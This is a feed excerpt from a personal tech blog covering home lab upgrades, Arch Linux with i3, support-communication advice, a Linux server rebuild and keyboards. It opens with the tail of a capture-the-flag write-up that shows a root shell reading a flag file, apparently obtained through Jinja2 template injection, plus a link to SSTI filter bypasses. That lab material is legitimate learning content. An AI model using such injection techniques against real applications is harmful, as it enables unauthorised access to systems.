</code></pre><pre><code>root@bb0be7618f85:/app# cat flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt 
foobarbaz
</code></pre><p>I&rsquo;ll leave you to get the flag for yourself on the live system ;)</p>
<p>Helpful reference:</p>
<ul>
<li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses</a></li>
</ul>
]]></content></item><item><title>Home lab updates v2</title><link>https://www.maclaren.dev/posts/2021-11/home_lab_updates/</link><pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-11/home_lab_updates/</guid><description>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&amp;rsquo;re do for an update!
What has changed? Server rebuild New (2nd hand) 24 port gigabit switch 900W UPS Synology DS918 NAS So what am I doing with all these toys? The server rebuild is probably one of the bigger things here. While I was already hosting VMs and Docker containers on this box when it was running Windows, it was unreliable at best thanks to forced updates/reboots in Windows 10.</description><content type="html"><![CDATA[<p>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&rsquo;re do for an update!</p>
<h1 id="what-has-changed">What has changed?</h1>
<ul>
<li><a href="../../2021-05/server_rebuild/">Server rebuild</a></li>
<li>New (2nd hand) 24 port gigabit switch</li>
<li>900W UPS</li>
<li>Synology DS918 NAS</li>
</ul>
<h1 id="so-what-am-i-doing-with-all-these-toys">So what am I doing with all these toys?</h1>
<p>The server rebuild is probably one of the bigger things here. While I was already hosting VMs and Docker containers on this box when it was running Windows, it was unreliable at best thanks to forced updates/reboots in Windows 10. Sigh. I rebuilt this server on Ubuntu 20.04 LTS and haven&rsquo;t regretted it for a second. Resource utilization is super low, so I can run more stuff on it (also playing around with Jellyfin now), and since it&rsquo;s Linux the Docker support is significantly better (obviously) so I&rsquo;ve been able to completely do away with any VM-based workloads.</p>
<p>Next up in technical significance is the DS918 NAS. What a game changer coming from my old NetGear NAS! Bonded 1Gbit NICs for super fast transfers, Docker support (so I&rsquo;ve got my failover PiHole server hosted here now), and built-in applications for cloud sync so I can also automate all of my offsite backups of critical data. Worth every cent, and despite my best efforts I still haven&rsquo;t even broken 50% utilization of the disk space I put into it!</p>
<p>The UPS and network switch are purely utilitarian. The UPS is connected to my server via USB so I can script a shutdown sequence if it&rsquo;s anything more than a momentary outage, but beyond that this will keep my whole network up and running for about 90 minutes in the event of a powerloss. Great in case I&rsquo;m in the middle of a meeting! The switch is just an upgrade over my full 8-port switch that was in use previously&hellip; may move to a PoE switch soon though&hellip; been eyeing another new AP!</p>
]]></content></item><item><title>Publish articles with GitHub Actions</title><link>https://www.maclaren.dev/posts/2021-11/actions/</link><pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-11/actions/</guid><description>Well, that was easier than expected. Take a look at peaceiris' actions-hugo repository for a workflow that can automate Hugo builds with all sorts of configurations.
I was expecting this project to take about an hour of tinkering, but it wound up taking under 5 minutes. Hooray!</description><content type="html"><![CDATA[<p>Well, that was easier than expected. Take a look at <a href="https://github.com/peaceiris/actions-hugo">peaceiris' <code>actions-hugo</code> repository</a> for a workflow that can automate Hugo builds with all sorts of configurations.</p>
<p>I was expecting this project to take about an hour of tinkering, but it wound up taking under 5 minutes. Hooray!</p>
]]></content></item><item><title>I still use Arch, btw</title><link>https://www.maclaren.dev/posts/2021-11/still_use_arch/</link><pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-11/still_use_arch/</guid><description>Yep, the meme lives on. Still getting by with Arch as a daily driver. Still running it through VirtualBox.
What&amp;rsquo;s great? Full control, and amazingly lightweight. Booted, and with my WM (i3) running, I&amp;rsquo;m measuring &amp;lt; 300MB of RAM usage and virtually zero CPU/disk usage. Windows or Mac OS sitting idle&amp;hellip; yeah, not comparable. Itg&amp;rsquo;s very refreshing having full control over just about every aspect of what I want.
I&amp;rsquo;m getting so used to using i3, with only extremly minor modifications to bindings, that I&amp;rsquo;ve actually updated a lot of my Amethyst bindings to align with i3 defaults.</description><content type="html"><![CDATA[<p>Yep, the meme lives on. Still getting by with Arch as a daily driver. Still running it through VirtualBox.</p>
<h1 id="whats-great">What&rsquo;s great?</h1>
<p>Full control, and amazingly lightweight. Booted, and with my WM (i3) running, I&rsquo;m measuring &lt; 300MB of RAM usage and virtually zero CPU/disk usage. Windows or Mac OS sitting idle&hellip; yeah, not comparable. Itg&rsquo;s very refreshing having full control over just about every aspect of what I want.</p>
<p>I&rsquo;m getting so used to using i3, with only extremly minor modifications to bindings, that I&rsquo;ve actually updated a lot of my Amethyst bindings to align with i3 defaults. It&rsquo;s just plain intuitive. Similarly, having a WM that&rsquo;s heavily keyboard driven, combined with qutebrowser and/or the Vimium extension in other browsers, makes it so that my hands rarely need to leave my keyboard. Obviously there are still some reasonably keyboard-unfriendly scenarios (<em>glances at Google sites</em>), but beyond that it&rsquo;s a pretty fantastic experience.</p>
<p>I will note that I really haven&rsquo;t tried gaming in this at all. I haven&rsquo;t poked at GPU passthrough, and there&rsquo;s really no point in even trying with the vGPU that VirtualBox provides. I <em>did</em> get gzdoom running, but it was like a slideshow. Regardless, I&rsquo;ve got Wintendo for that.</p>
<h1 id="whats-just-ok">What&rsquo;s just OK?</h1>
<p>Now I&rsquo;m going to preface this by noting that I know I&rsquo;m not doing myself any favours by 1) using Arch, and 2) not using a major DE like Plasma.</p>
<p>The only thing that is really, really painful coming from Windows/MacOS is the lack of a reliable clipboard system without having to get something setup. Yes, I know that I&rsquo;m getting <em>exactly</em> what I asked for, but I&rsquo;m still going to complain as it&rsquo;s really my only complaint &lt;_&lt;</p>
<p>This is of course something I&rsquo;ll get around to addressing, but I had to bitch :P</p>
<h1 id="what-sucks">What sucks?</h1>
<p>VirtualBox has some annoying bugs, and &ldquo;features&rdquo;, but not in ways that actually break things. Some minor annoyuances include:</p>
<ul>
<li>Sometimes, but only sometimes, audio in my VM will get heavily distorted or &ldquo;poppy&rdquo;. The only workaround is to relaunch VirtualBox. Even restoring the VM from a snapshot doesn&rsquo;t reproduce it, so this feels like something with the hypervisor rather than the Guest.</li>
<li>Despite being in full-screen mode, with no way to escape the guest short of ctrl-alt-f, there are still other key combinations that will escape the guest&hellip; Most notably among these chorgs is Super-L which of course is a default in my WM, but every f&amp;*king time I hit it to move a window around it locks my machine (via Windows). Need to figure that out still&hellip;</li>
</ul>
<h1 id="so-whats-next">So what&rsquo;s next?</h1>
<p>Well, in my current work position I can&rsquo;t actually use Linux as my full time daily driver <em>however</em> I have already moved all of my personal work over to it and LOVE it. Significantly less friction than trying to work on projects through WSL, fewer annoyances than using MacOS and its menagerie of ancient/outdated packages and lack of customization, and my fingers would fall off trying to outline all the reasons that I prefer it over working directly in Windows.</p>
<p>I guess this is all to say that despite running Windows under the covers, I have been, and will still be, spending more time in Linux than what&rsquo;s actually powering it. I&rsquo;m OK with that for now. It&rsquo;ll be interesting to see where Win 11 goes. I wouldn&rsquo;t mind taking the full jump over to Linux, but it will likely always be as a dual-boot as when I game I don&rsquo;t want to have to tinker.</p>
]]></content></item><item><title>Relentless follow-through in Support</title><link>https://www.maclaren.dev/posts/2021-11/expectations/</link><pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-11/expectations/</guid><description>Way back in April 2020 I wrote an article called Written communication for support which covered some high level best practices around setting, managing, and resetting expectations. Think of this as a spiritual successor to that article, as we&amp;rsquo;re going to talk about the other side of the coin - relentless follow-through.
To put &amp;ldquo;relentless follow-through&amp;rdquo; in more direct terms, I want to discuss some best practices around timeliness of responses even when there&amp;rsquo;s no news, internal follow-up and expectation setting, and some options for collaboration (depending on the size/maturity of your business).</description><content type="html"><![CDATA[<p>Way back in April 2020 I wrote an article called <a href="../../2020-04/written-communication-for-support/">Written communication for support</a> which covered some high level best practices around setting, managing, and resetting expectations. Think of this as a spiritual successor to that article, as we&rsquo;re going to talk about the other side of the coin - relentless follow-through.</p>
<p>To put &ldquo;relentless follow-through&rdquo; in more direct terms, I want to discuss some best practices around timeliness of responses <em>even when there&rsquo;s no news</em>, internal follow-up and expectation setting, and some options for collaboration (depending on the size/maturity of your business).</p>
<h1 id="relentless-sounds-like-a-strong-word">Relentless sounds like a strong word&hellip;</h1>
<p>It is.</p>
<p>While I don&rsquo;t remember the exact etymology of this phrase, this is something that was said to me early in my career and it really stuck. Frankly, regardless of <em>technical</em> skill, I&rsquo;d argue that the ability to effectively manage expectations and follow-through on commitments is the single most important aspect of success for anyone customer facing. This comes with a <em>lot</em> of &ldquo;gotchas&rdquo; though.</p>
<ul>
<li>How do you know what you&rsquo;re saying is true or realistic?</li>
<li>How can you advise on timelines?</li>
<li>What other resources (human or otherwise) can you leverage?</li>
</ul>
<p>We&rsquo;ll deconstruct a few of these, but before we get to those I want to try to sum up this entire concept in one paragraph in case we hit a TL;DR situation:</p>
<p><em>Your ability, as a support engineer, to keep your customers informed of the progress of investigations is paramount. In terms of customer satisfaction this is often more important than the actual time to resolution.</em></p>
<h2 id="setting-realistic-expectations">Setting realistic expectations</h2>
<p>Without rehashing too much content in the other article, the key point I want to get across here is that it doesn&rsquo;t help to bullshit people. I&rsquo;m not suggesting airing dirty laundry, or providing exhaustive detail, but if something flat out cannot be done it doesn&rsquo;t help to imply that it might be. Similarly, it&rsquo;s not overly helpful to imply that extremely minor (low visibility/low impact) bugs will get fixed quickly. There are some wording techniques to help get around these, and that will help convey this messaging in a more subtle fashion.</p>
<pre><code>Sorry to hear that you're running into &lt;Issue X&gt;. We've been able to confirm this as a bug here, and are following up with our teams internally to work on a fix. I can't advise on when, we'll be able to deliver a fix for this problem, however I'd suggest keeping an eye on our release notes where a fix would be advertised.

In the mean time, we'd suggest the following workaround to help mitigate this issue in your usage:

1. 
2.
3.
etc....

Please let us know if you have any further questions!
</code></pre><p>The wording here is strategic in a few ways:</p>
<ul>
<li>The issue in question is specifically called out and acknowledged.</li>
<li>Ownership of the problem has been transferred to another <em>non-customer facing</em> organization.</li>
<li>Expectations are set that a fix may never materialize, or at the very least may not be prioritized.</li>
<li>The customer is provided with information on how they can see progress.</li>
<li>A workaround is offered to help mitigate their business impact.</li>
</ul>
<p>Five key factors in, effectively, two lines of text.</p>
<p>Building on this, you may also find yourself working in positions where you&rsquo;re working extremely closely with customers and have relationships <em>with them</em> that you can leverage. Often, issues will be exaggerated or at the very least not fully understood by the people reporting them. When you&rsquo;ve got this level of access, especially in a real-time fashion, it can be extremely helpful to spend a few minutes dissecting the actual problematic use-case to understand both if it&rsquo;s a realistic scenario, and whether or not it&rsquo;s something that&rsquo;s worth everyone&rsquo;s time to follow up on.</p>
<p>As an example, you may receive a ticket like this:</p>
<pre><code>Hi Support, 

X part of the UI is broken in your product. This is blocking critical workflows on our side. See attached.
</code></pre><p>A few helpful questions to ask to start (either in your own head, or to the customer):</p>
<ul>
<li>Is the only way to do what they&rsquo;re trying to do (i.e. is this actually blocking work)?
<ul>
<li>Note: This is two-fold - both helps clarify the priority of the issue, as well as your ability to offer alternatives.</li>
</ul>
</li>
<li>Is this problem actually a problem, or is it &ldquo;working as intended&rdquo; and unlikely to be &ldquo;fixed&rdquo;?</li>
<li>Does the person reporting the problem fully understand the scenario, or are they just relaying information?</li>
</ul>
<p>If you find that the answer to most, or all, of these questions is &ldquo;No.&rdquo; there&rsquo;s ample opportunity here to have a discussion with the complaining party about what&rsquo;s realistic to deliver on and to negotiate a proper prioritization for both you <em>and</em> them as they&rsquo;ll also have stakeholders to report back to.</p>
<h2 id="managing-timelines">Managing timelines</h2>
<p>This is a very tricky one in the Support world, and I don&rsquo;t want to imply that you&rsquo;ll ever have much control over it given the interrupt-driven nature of the work and heavy reliance on other parts of your organization. Despite the lack of control over the <em>technical outcome</em> in some scenarios, this is also the concept at the very core of &ldquo;relentless follow-through&rdquo;.</p>
<p>At a high level, this is your time to set the cadence for <em>standing</em> communication and by that I mean the pace of communication <em>when there is nothing actionable to provide to the customer</em>. As a side note - some companies address through this &ldquo;next response SLAs&rdquo;, which I&rsquo;d generally argue are overly aggressive and detract from quality, but you may see that come up. I&rsquo;d generally suggest setting the expectation <em>and delivering on it</em> of an update <em>at least</em> every two business days outlining current status. Working on an investigation that has been escalated to engineering and haven&rsquo;t heard back? No problem, note that the investigation is still ongoing and you&rsquo;ll provide another update on status before end-of-day two days from then. Haven&rsquo;t had a chance to look at an issue that&rsquo;s in your ballpark to address? Same deal, &ldquo;apologies, still investigating&rdquo;, etc&hellip;</p>
<p>Similarly, you&rsquo;ll generally want to use a similar cadence for issues where you&rsquo;re reliant on someone else to provide you with an update. Escalation with engineering? Ping them every 2 days (or more often depending on issue impact). Waiting to hear back from your real estate agent? Ping them every 2 days. This is something applicable well beyond just the world of Support, and I think you&rsquo;ll find it helpful in just about any aspect of life. Similarly, I think you&rsquo;ll get a solid realization of when other people are doing it&hellip; and when they <em>aren&rsquo;t</em>.</p>
<p>Realizing that I just provided seemingly trivial examples following a statement about how tricky this is, that&rsquo;s intentional. The actual <em>execution</em> of this concept is also trivial, yet this is the <em>number one</em> reason I&rsquo;ve seen for escalations in any support organization I&rsquo;ve worked at. Customers are left wondering as to what the status of their investigation is, or why it hasn&rsquo;t progressed, or why they haven&rsquo;t heard back on questions they&rsquo;ve asked. Obviously if things are dragging on for extreme periods of time there will be some legitimate frustration, but this sort of communication technique <em>and cadence</em> will generally curb a significant majority of non-technical escalations.</p>
<h2 id="leveraging-others">Leveraging others</h2>
<p>While this may seem like the basics of working on any sort of team, this is intentionally last in my list as both of the topics above play directly into this. I&rsquo;m not going to spend a significant amount of time on this point, either, as it&rsquo;s always going to be subjective. I&rsquo;ll leave it simply by stating that the relationships/connections you build within your team/company/customers are <em>almost always</em> going to be your most valuable asset in terms of delivery. Short of extremely simplistic products, it is virtually impossible for an individual to be an expert on <em>everything</em> - your ability to know who to ask <em>and to leverage your relationship with them</em> to get a timely response/deeper understanding will pay dividends even beyond the scope of an individual job.</p>
<h1 id="this-all-sounds-so-simple">This all sounds so simple</h1>
<p>It does, and in some respects it is. The biggest challenge around all of this is the mindset shift to fit within it and the actual execution on a consistent basis. It may seem counterintuitive to send someone an update saying that there&rsquo;s no update, or to nag someone that you trust is doing the best they can, however in both cases it demonstrates <em>your</em> investment in the situation and that in all regards nothing, and no one, has been forgotten about.</p>
]]></content></item><item><title>I use Arch, btw</title><link>https://www.maclaren.dev/posts/2021-10/arch_btw/</link><pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-10/arch_btw/</guid><description>I use Arch, btw I&amp;rsquo;ve been using Linux for ages, nearly two decades at this point. I actually dug out my old Mandrake and Slackware CDs while going through a box in my basement the other day&amp;hellip; quite the flashback.
Despite that tenure on at least some of the hardware I&amp;rsquo;ve owned at any given time, I&amp;rsquo;ve never really used it as a daily driver for desktop usage. That changed today when I finally sat down and set up Arch, complete with forgetting to install a boot loader, on my main rig.</description><content type="html"><![CDATA[<h1 id="i-use-arch-btw">I use Arch, btw</h1>
<p>I&rsquo;ve been using Linux for ages, nearly two decades at this point. I actually dug out my old Mandrake and Slackware CDs while going through a box in my basement the other day&hellip; quite the flashback.</p>
<p>Despite that tenure on at least some of the hardware I&rsquo;ve owned at any given time, I&rsquo;ve never really used it as a daily driver for <em>desktop</em> usage. That changed today when I finally sat down and set up Arch, complete with forgetting to install a boot loader, on my main rig.</p>
<p>One catch though&hellip; I did it in Virtual Box.</p>
<h1 id="but-its-in-a-vm">But it&rsquo;s in a VM</h1>
<p>Yeah, yeah, yeah. I know. I&rsquo;d prefer to have it on bare metal as well, however my main passtime outside of tinkering with technology is playing WoW Classic. At first you may think &ldquo;Ok, that definitely runs under Wine/Proton, right?&rdquo; and yes, it does, but Blizzard also has a long history of banning Linux gamers for perceived cheating, &ldquo;using an unsupported operating system&rdquo;, or any other number of non-sensical reasons.</p>
<p>In any case, that has kept me using Windows as the main OS installed on bare metal. Flip side, Virtual Box has come a long way and is exceptionally good for virtualizing a desktop OS - especially when compared to Hyper-V which I was using previously.</p>
<p>All that to say, I&rsquo;ve been working out of i3 on Arch all day despite it running in a VM and the only thing it has made me want to do is quit WoW so I can just use this without any additional overhead. It&rsquo;s wonderful.</p>
<h1 id="how-did-the-setup-go">How did the setup go?</h1>
<p>The Arch Wiki&rsquo;s installation guide is reasonably good, though like all things Arch it expects you to do a fair bit of research for yourself. If you haven&rsquo;t toyed around with Arch before, or at least don&rsquo;t have a very good understanding of how to do things like manually configure a network interface from scratch, I&rsquo;d suggest against doing this for your first time unless you&rsquo;re into learning-by-doing (like I am).</p>
<p>I&rsquo;ve dabbled with Gentoo in the past, and this is nowhere near that level of confusing to setup, but it&rsquo;s still not a pretty GUI like you&rsquo;ll get with Ubuntu or Pop, etc&hellip; That said, that didn&rsquo;t really factor into my decision.</p>
<p>I had a few hiccups during installation, mostly due to not quite understanding what I was getting &ldquo;for free&rdquo; with the installation vs what was running on the live disk I used for the installation. This meant that I had to spend a good 30-45 minutes figuring out all of the packages I needed to get my networking functional (I ended up using <code>networkd</code> for the sake of having it in line with my other boxen). Beyond that, though, was an infuriating 90 minute stretch of trying to get i3 to work&hellip;</p>
<p>i3 relies on <code>i3-config-wizard</code> to do the initial configuration file creation to actually be able to start i3, however <em>that wizard requires X to be running despite still being a text interface</em> which is beyond bizarre. It wasn&rsquo;t until I got xmonad running (and realizing that it wasn&rsquo;t for me) that I was able to actually get i3 configured and working. Haven&rsquo;t looked back since. After coming from a lot of tinkering with Amethyst, DisplayFusion, Yabai, and other &ldquo;window managers&rdquo; on Windows and MacOS, having something like i3 and it&rsquo;s integration with Xorg is&hellip; well, mindblowing. Full control over everything. It&rsquo;s perfect.</p>
<p>Without getting into the religious debates of what WM is the best, least bloated, etc&hellip; This is a fantastic example of the type of freedom you can get when you move away from Windows/MacOS and into an ecosystem that&rsquo;s literally built around user choice and flexibility. I&rsquo;ve never been one to enjoy playing within the rules, and now I truly don&rsquo;t have to.</p>
<h1 id="hows-it-going">How&rsquo;s it going?</h1>
<p>I&rsquo;ll do another post in a few weeks to recap using Arch + i3 as a daily driver for that period of time, but initial impressions are exclusively positive.</p>
<p>My experience of using Linux as a desktop OS in the past were mostly sullied by my own choices (Slackware as a daily driver? Eep!) or lack of knowledge at the time&hellip; but hey, that&rsquo;s how you learn. With the readily available knowledge between Wikis, colleages, friends, and Reddit it&rsquo;s now somewhat trivial to find answers to questions that would have taken weeks to sort out on IRC or forums (though I still enjoy both).</p>
<p>As an aside, the workspace approach here (and more importantly being able to trivially hotkey windows over to specific workspaces) is a game changer after coming from Windows/MacOS. I know that can all be done through various ways there as well, and I use those approaches, but it&rsquo;s <em>seamless</em> in i3 (and I&rsquo;m sure many other WMs). I love it.</p>
<p>Coming over from MacOS for work purposes, and Windows for personal projects, this is also a breath of fresh air. I&rsquo;ve got control over what&rsquo;s running, resource utilization is way down, and things are just much&hellip; snappier. Despite running this in a VM (and one that only has access to 1/3 my system resources) it is <em>vastly</em> more responsive than Windows 10 is on my beast or a PC, or MacOS on my max-spec 2019 MBP. It&rsquo;s really quite mind-boggling what I was living with, and how much better it could have been&hellip; despite running exactly the same applications!</p>
<p>The other thing that&rsquo;s of course beneficial here is that nearly all of my projects are based around stuff that just better works on Linux anyway. I don&rsquo;t need to deal with MacOS shipping with GNU Utils that are decades out of date, or the bizarre setup that is WSL (though WSL is still pretty cool!) - I&rsquo;ve got the latest and greatest at my fingertips, and nothing to get in the way of my work&hellip; only the things that I&rsquo;ve chosen to pull in to <em>support</em> my work. Is this&hellip; freedom?</p>
<h1 id="whats-next">What&rsquo;s next?</h1>
<p>Current things for me to tweak/understand:</p>
<ul>
<li>Can I get any GPU passthrough configured for this, and do I even need/want to? Performance is great for any non-gaming, and I can just pop out to Windows for that.</li>
<li>Play around with some more i3 config to get tiling layout just how I want it, and align keybinds with what I&rsquo;m using on my other systems to limit context switching.</li>
<li>Play around with i3 gaps for a sexier layout, though I am loving the completely efficient use of space that i3 is giving me so far.</li>
</ul>
]]></content></item><item><title>Server Rebuild</title><link>https://www.maclaren.dev/posts/2021-05/server_rebuild/</link><pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-05/server_rebuild/</guid><description>What did I do? Half fueled by beer, and half by a playlist of keygen tracks, I decided that it would be a good idea to finally getting around to rebuilding my long-lived server&amp;hellip; No more Windows and its infuriating forced updates (which you used to be able to override), lack of clear/consistent OS level event scripting for integration with my UPS, or garbage-tier support from Docker. I wanted something that I&amp;rsquo;d finally have the level of control I wanted for something that backs pretty much eveverything I use outside of work.</description><content type="html"><![CDATA[<h1 id="what-did-i-do">What did I do?</h1>
<p>Half fueled by beer, and half by a playlist of keygen tracks, I decided that it would be a good idea to finally getting around to rebuilding my long-lived server&hellip; No more Windows and its infuriating forced updates (which you used to be able to override), lack of clear/consistent OS level event scripting for integration with my UPS, or garbage-tier support from Docker. I wanted something that I&rsquo;d finally have the level of control I wanted for something that backs pretty much eveverything I use outside of work.</p>
<h1 id="why-did-i-do-it">Why did I do it?</h1>
<p>There were a few things, eluded to above, that really drove this:</p>
<ul>
<li>Alcohol</li>
<li>&ldquo;I&rsquo;ve done this a million times, it&rsquo;ll only take 2 hours tops&rdquo;</li>
<li>A need for better scripting around UPS status</li>
<li>A need to avoid repeat downtime due to forced OS updates/reboots</li>
<li>Really inefficient memory usage on the server due to poor Docker support, pushing me to VMs for several usecases</li>
<li>With Docker on Windows, there was (is?) no way to expose network shares to containers, so I was forced even more over to VMs</li>
<li>I was sick and tired of needing to use an RDP client to manage my server when I could just be scripting things instead</li>
</ul>
<h1 id="prep-work">Prep work</h1>
<p>Arguably the largest amount of work here was ensuring that I had all of my configs and persistent data backed up so that it would survive the migration. My old setup was using Hyper-V and Docker backed on a software RAID array - more on the RAID setup later, as it was annoying - so I wanted to get all of that data somewhere that I could either mount it and access it, or easily rebuild it. For the most part, this was just wrangling config files out of VMs and moving them over to my NAS or <a href="https://github.com/maclarel/homelab">repo</a> so that I could pull them later.</p>
<p>Next up was planning out the build, partition schemes and all. My server had three main volumes originally:</p>
<ul>
<li>256GB SSD</li>
<li>1TB RAID-1</li>
<li>500GB HDD</li>
</ul>
<p>I didn&rsquo;t want to waste time ever dual booting as there was simply no reason to for a machine that lives in my closet, so I split up the SSD as follows (leaving some extra space if I need to grow any partition later):</p>
<pre><code>/ 30g
/home 50g
/data 130g
/swap 4g
</code></pre><p>I&rsquo;m not sold on the <code>swap</code> ever being useful, but it&rsquo;s there. I had many occasions on Windows where I would run out of memory due to ridiculous memory leaks with WSL/Docker, so I figured better safe than sorry. Based on what I&rsquo;m seeing so far&hellip; this really wasn&rsquo;t needed.</p>
<p>The <code>/data</code> partition is there simply if I need it for apps requiring high disk performance, but so far Plex is quite happy running off of the RAID array and pulling data from my NAS. This may wind up just sitting idle. Similarly, not much use for <code>/home</code>. This split was really just so if I ever wanted to reinstall the OS I could maintain those partitions without losing data.</p>
<p>Everything else in terms of data access was just understanding how to mount my shares, and that was pulled from my existing VMs.</p>
<p>With my data set aside, I was ready to move forward&hellip;</p>
<h1 id="the-reinstall">The reinstall</h1>
<p>Well, installing Ubuntu Server is as braindead as it ever has been. Zero drama there.</p>
<p>Once that was online, I tried to mount my NTFS drives only to find two surprises:</p>
<ol>
<li>I could mount my Windows RAID array and read the data, yay!</li>
<li>I could only mount the NTFS partitions in read-only because the filesystems had apparently been corrupted by an earlier reboot during startup&hellip; Joy.</li>
</ol>
<p>Fortunately, I had backups of any data I needed, so no real issue there, but it did mean that I needed to rebuild these. It turns out creating a software RAID on Linux is pretty braindead as well:</p>
<pre><code>parted -a optimal /dev/sda mklabel gpt
parted -a optimal /dev/sda mkpart primary btrfs 0% 100%
parted -a optimal /dev/sda set 1 raid on
parted -a optimal /dev/sda print

parted -a optimal /dev/sdb mklabel gpt
parted -a optimal /dev/sdb mkpart primary btrfs 0% 100%
parted -a optimal /dev/sdb set 1 raid on
parted -a optimal /dev/sdb print

mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sd[ab]1
mdadm --detail /dev/md0
mdadm --examine /dev/sd[ab]1

mkfs.btrfs /dev/md0

mount /dev/md0 /mnt/tesla
</code></pre><p>From there, it was just a matter of adding it to <code>/etc/fstab</code> and I was off to the races. Same for my network shares. Easy stuff.</p>
<p>Moving over <code>nginx</code> and <code>pihole</code> was trivial, and in fact somewhat improved, as they were both Docker based anyway.</p>
<p>Now the fun part - moving my &ldquo;Linux ISO gathering&rdquo; setup (torrent box + vpn) and Plex over to Docker. I decided to start with Plex - pretty much zero drama there, plug &amp; play with <code>plexinc/pms-docker</code> though I did have to rebuild my library and unregister the old (now duplicate) server.</p>
<p>qBittorrent though, that was a challenge. Let&rsquo;s talk about that.</p>
<h1 id="challenges">Challenges</h1>
<p>Originally, I was running qBittorrent in a VM so that I could send all of my network traffic out through my VPN provider without needing to impact the host&rsquo;s networking, but this meant maintaining a VM just for this purpose. I originally went this way after the rebuild on Ubuntu Server but I&rsquo;m going to be frank in saying that qemu/kvm are miserable to manage from command line, and I had no interest in setting up an X env to use virtman or anything else&hellip; I was just going to figure it out with Docker.</p>
<p>Through this, I found <code>https://github.com/tprasadtp/protonvpn-docker</code> which is great - proxied networking through a container running the VPN, and container level reliance on things running. This still had some problems that I had to address through.</p>
<ol>
<li>The relative container reliance offered through docker-compose just means the other container has to be up, not that the VPN needed to be operational.</li>
<li>The VPN &ldquo;kill switch&rdquo; functionality is unreliable at best in the container world.</li>
<li>With the VPN connected, I&rsquo;d <a href="https://github.com/tprasadtp/protonvpn-docker/issues/15#issuecomment-841824116">lose all LAN connectivity to the server I was trying to expose</a>.</li>
</ol>
<p>I was able to sort out the LAN issue in the Issue linked above, fortunately, but definitely burned a few hours there playing around with different ways to pass in custom <code>ip route</code> commands. Fortunately, the VPN client already handles this for me and the author of that container already exposed the functionality. It took some hunting to figure out, but it&rsquo;s now working. Awesome, now let&rsquo;s figure out a kill switch!</p>
<p>If you&rsquo;re unfamiliar with the VPN &ldquo;kill switch&rdquo;, it&rsquo;s basically a way to ensure that no network traffic hits the internet from the machine in question if the VPN connection goes down. The VPN I&rsquo;m using does this through managing IPTables rules, however this allows a brief gap where traffic can still slip out when used in a container setting. With rapid reconnects this isn&rsquo;t a huge problem, but better to just not have that surface anyway. I was eventually able to deal with this by forcing the client (<code>qBittorrent</code>) to bind to the VPN&rsquo;s network interface in the VPN container. This interface is ephemeral, but consistently named - if the VPN goes down, the client drops ALL connections as it no longer has a network interface at all, and when it comes back up it detects it and rebinds. This isn&rsquo;t as glorious as using some dedicated routing for it, but it works and is (at this point) more reliable than the kill switch.</p>
<h1 id="where-did-it-all-land">Where did it all land?</h1>
<p>This brings me to where I am now. The server is up, I no longer have a single VM running (everything is in Docker), and I can manage everything from an SSH client on my phone. It&rsquo;s pretty much ideal. Functionality aside though&hellip; this actually saves me money.</p>
<p>When I was running these workloads on Windows, due to the VM reliance, I was consistently using 10-11GB of my 16GB RAM. With this setup on Linux, I&rsquo;m now using <em>less than 1.5GB</em>, or an 85% reduction in resource usage. I&rsquo;ve gone from trying to source another 16GB of RAM, to wondering what I&rsquo;m going to do with all the extra resources I now have at my disposal.</p>
<p>More to come, I&rsquo;m sure, as well as likely no end to problems, but this has been a fun ~2~ 10 hour project, and I am damn happy with the results at this point!</p>
]]></content></item><item><title>Keyboard ascension</title><link>https://www.maclaren.dev/posts/2021-05/keebs/</link><pubDate>Sat, 01 May 2021 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2021-05/keebs/</guid><description>Keebs Mechanical keyboards, sometimes calld keebs, come up from time to time as a bit of a meme. &amp;ldquo;Oh, you&amp;rsquo;ve got one of those loud keyboards.&amp;rdquo; or &amp;ldquo;Why on earth did you spend $500 ona a keyboard that does the same thing as the $5 one I got from Office Depot?&amp;rdquo;.
I&amp;rsquo;ll say that, for the really cheap end of the spectrum with mechanical keyboards, this really is a meme that holds up.</description><content type="html"><![CDATA[<h1 id="keebs">Keebs</h1>
<p>Mechanical keyboards, sometimes calld keebs, come up from time to time as a bit of a meme. &ldquo;Oh, you&rsquo;ve got one of those <em>loud</em> keyboards.&rdquo; or &ldquo;Why on earth did you spend $500 ona a keyboard that does the same thing as the $5 one I got from Office Depot?&rdquo;.</p>
<p>I&rsquo;ll say that, for the really cheap end of the spectrum with mechanical keyboards, this really is a meme that holds up. A cheap mechanical keyboard is really not going to be a huge difference from whatever you got with your prebuilt machine. Somewhat depressingly, however, I&rsquo;ll note that &ldquo;cheap&rdquo; here really means a budget of under $200 USD&hellip;</p>
<p>This is largely going to be talking about split keyboards, too. While there are <em>very</em> nice traditional layout (108 key, TKL, 65%, whatever) mechanical keyboard builds, I think the real value is with a split setup if you spend any considerable amount of time typing.</p>
<h1 id="why-you-should-care">Why you should care</h1>
<p>&ldquo;Yeah, yeah, yeah I&rsquo;m not some 1337 h4x0r, why would I care about my keyboard?&rdquo; you may ask&hellip; Well, neither am I. In fact, I spend a significant majority of my time writing - documentation, bug reports, general communication, etc&hellip; Working remotely, typing as a form of communication is pretty easily 6+ hours of my day on any given day.</p>
<p>I&rsquo;m betting that if you work at a computer, that number is probably similar for you as well. Are you shitposting on Slack or Discord? Are you writng emails? Are you building out team plans? There&rsquo;s a good chance that a bulk of your time is spent typing if you&rsquo;re doing those things. Certainly, if you&rsquo;re coding for a living you&rsquo;ll also fall under this umbrella.</p>
